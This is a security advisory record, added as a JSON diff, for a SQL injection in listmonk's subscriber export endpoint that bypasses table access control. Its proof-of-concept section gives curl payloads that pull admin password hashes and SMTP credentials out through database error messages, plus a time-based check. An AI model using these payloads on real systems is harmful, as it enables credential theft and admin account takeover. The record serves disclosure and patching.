@@ -1,0 +1,57 @@
+{
+  "id": "GHSA-xgjr-7j9q-2h4r",
+  "modified": "2026-11-06T18:30:03.804618782Z",
+  "published": "2026-11-06T18:15:17Z",
+  "aliases": [
+    "CVE-2026-62361"
+  ],
+  "summary": "listmonk: SQL Injection in `/api/subscribers/export` bypasses table access control, leaking admin password hashes and SMTP credentials",
+  "details": "### Summary\n\nA SQL injection vulnerability in `GET /api/subscribers/export` allows an authenticated user with the `subscribers:sql_query` permission to bypass the table access control that exists on the regular query endpoint (`GET /api/subscribers`) and read arbitrary tables from the database — including `users` (bcrypt password hashes) and `settings` (SMTP credentials, API keys). Both error-based and time-based exfiltration techniques are confirmed to work. This creates a privilege escalation path: `subscribers:sql_query` → hash exfiltration → offline bcrypt crack (cost factor 6) → Super Admin account takeover.\n\n---\n\n### Details\n\nThe subscriber query feature accepts a user-controlled `query` parameter that is injected directly into a SQL template via `strings.ReplaceAll`. The regular query endpoint `GET /api/subscribers` correctly calls `validateQueryTables` to block access to sensitive tables before execution. The export endpoint `GET /api/subscribers/export` **omits this call entirely**, creating an asymmetric bypass of an intentional security control.\n\n**`internal/core/subscribers.go` — protected path (regular query):**\n\n```go\n// QuerySubscribers — table validation present\nstmt := strings.ReplaceAll(c.q.QuerySubscribersTpl, \"%query%\", cond)\nif err := validateQueryTables(c.db, stmt, allowedSubQueryTables); err != nil {\n    return nil, 0, echo.NewHTTPError(http.StatusBadRequest,\n        fmt.Sprintf(\"Error preparing subscriber query: %v\", err))\n}\n```\n\n**`internal/core/subscribers.go` — vulnerable path (export):**\n\n```go\n// ExportSubscribers — NO table validation\nstmt := strings.ReplaceAll(c.q.QuerySubscribersForExport, \"%query%\", cond)\ntx, err := c.db.Preparex(stmt)  // executes directly without restriction\n```\n\n**`queries/subscribers.sql` — the `%query%` placeholder is injected into a WHERE clause:**\n\n```sql\nSELECT subscribers.id, subscribers.email, ...\nFROM subscribers\nLEFT JOIN subscriber_lists ON ...\nWHERE (subscribers.status != 'blocklisted') AND %query%\nORDER BY subscribers.id ASC LIMIT ...\n```\n\nBecause the export path does not run inside a `ReadOnly` transaction (unlike the dry-run used in `QuerySubscribers`), PostgreSQL CTEs with data-modifying statements (`WITH ... UPDATE ... RETURNING`) are also executable, enabling write operations beyond read-only exfiltration.\n\n---\n\n### PoC\n\n**Prerequisites:** Authenticated session with `subscribers:sql_query` and `subscribers:get_all` permissions.\n\n**Step 1 — Confirm the bypass (blocked on query, open on export):**\n\n```bash\n# Blocked on regular endpoint:\ncurl -s \"http://TARGET:9000/api/subscribers?query=(SELECT+1+FROM+users+LIMIT+1)+IS+NOT+NULL\" \\\n  -H \"Cookie: session=SESSION_TOKEN\"\n# → HTTP 400: {\"message\":\"Error preparing subscriber query: table 'users' is not allowed\"}\n\n# Bypassed on export endpoint:\ncurl -s \"http://TARGET:9000/api/subscribers/export?query=(SELECT+1+FROM+users+LIMIT+1)+IS+NOT+NULL\" \\\n  -H \"Cookie: session=SESSION_TOKEN\"\n# → HTTP 200: returns subscriber rows with no error\n```\n\n**Step 2 — Error-based exfiltration of admin password hash:**\n\n```bash\ncurl -s \"http://TARGET:9000/api/subscribers/export?\\\nquery=CAST((SELECT+password+FROM+users+LIMIT+1)+AS+integer)+\u003e+0\" \\\n  -H \"Cookie: session=SESSION_TOKEN\"\n```\n\nResponse:\n```json\n{\n  \"message\": \"Error fetching Subscribers: pq: invalid input syntax for type integer: \\\"$2a$06$vI8n66eJwWCQDms5d47up.TmBYUsxRF13sw8efTh8TCyMQVLX2cn.\\\"\"\n}\n```\n\n**Step 3 — Error-based exfiltration of SMTP credentials:**\n\n```bash\ncurl -s \"http://TARGET:9000/api/subscribers/export?\\\nquery=CAST((SELECT+value::text+FROM+settings+WHERE+key='smtp'+LIMIT+1)+AS+integer)+\u003e+0\" \\\n  -H \"Cookie: session=SESSION_TOKEN\"\n```\n\nResponse:\n```json\n{\n  \"message\": \"Error fetching Subscribers: pq: invalid input syntax for type integer: \\\"[{\\\"host\\\": \\\"smtp.yoursite.com\\\", \\\"port\\\": 25, \\\"enabled\\\": true, \\\"password\\\": \\\"...\\\", \\\"username\\\": \\\"...\\\"}]\\\"\"\n}\n```\n\n**Step 4 — Time-based blind confirmation:**\n\n```bash\ntime curl -s \"http://TARGET:9000/api/subscribers/export?query=pg_sleep(3)+IS+NOT+NULL\" \\\n  -H \"Cookie: session=SESSION_TOKEN\"\n# Returns after ~3 seconds — confirms arbitrary SQL function execution\n```\n\n---\n\n### Impact\n\nThis is a SQL injection vulnerability that bypasses an intentional security control. Any user with the `subscribers:sql_query` permission can:\n\n- Read bcrypt password hashes of all admin accounts (including Super Admin)\n- Extract SMTP credentials, API keys, and all values stored in the `settings` table\n- Chain with offline bcrypt cracking (cost factor 6, fast to crack) for full account takeover\n- Execute data-modifying SQL via PostgreSQL CTEs (write impact)\n\n**Attack chain:** `subscribers:sql_query` → SQLi on export → bcrypt hash exfiltration → offline crack → Super Admin takeover → full instance compromise.\n\nThis finding is **distinct** from the accepted risk in listmonk's security policy (\"SQL injection via subscriber query is a known limitation\"). The regular query endpoint correctly applies `validateQueryTables` to prevent access to sensitive tables. The export endpoint is missing that same guard — this is an implementation gap in a deliberate security control, not an accepted design limitation.",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "Go",
+        "name": "github.com/knadh/listmonk",
+        "purl": "pkg:golang/github.com/knadh/listmonk"
+      },
+      "ranges": [
+        {
+          "type": "SEMVER",
+          "events": [
+            {
+              "introduced": "0"
+            },
+            {
+              "fixed": "1.1.1-0.20260619102436-c0a6525009a6"
+            }
+          ]
+        }
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/11/GHSA-xgjr-7j9q-2h4r/GHSA-xgjr-7j9q-2h4r.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/knadh/listmonk/security/advisories/GHSA-xgjr-7j9q-2h4r"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-62361"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/knadh/listmonk/commit/c0a6525009a65265230185f16e8674dcc83aa024"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/knadh/listmonk"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/knadh/listmonk/releases/tag/v6.2.0"
+    }
+  ]
+}
